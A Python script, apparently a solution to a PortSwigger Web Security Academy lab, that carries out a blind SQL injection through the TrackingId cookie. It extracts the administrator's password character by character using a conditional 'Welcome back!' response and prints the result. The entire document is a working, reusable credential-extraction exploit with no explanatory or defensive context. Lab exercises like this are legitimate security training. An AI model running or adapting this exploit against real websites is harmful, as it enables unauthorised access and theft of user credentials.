import requests
from bs4 import BeautifulSoup


def sql_injection():
    password = ""
    alphabet ="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    url = "https://0a0a002b04c523bd80ee768100eb0072.web-security-academy.net/filter?category=Pets"
    
    while len(password) < 20:  # Continue until password length is 20
        found = False
        for letter in alphabet:
            payload = f"7koGNOulfowemfHU' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), {len(password)+1}, 1) = '{letter}; session=AzMPUO95jJiVNFQxpmPO0iycwYHrbitw"
            header = {
                "cookie" : f"TrackingId={payload}"
            }
            r = requests.get(url=url, headers=header)
            if "Welcome back!" in r.text:
                password += letter
                print(f"Found character: {letter}")
                found = True
                break
        
        if not found:
            print("Character not found, ending.")
            break
    
    print(f"Recovered password: {password}")

sql_injection()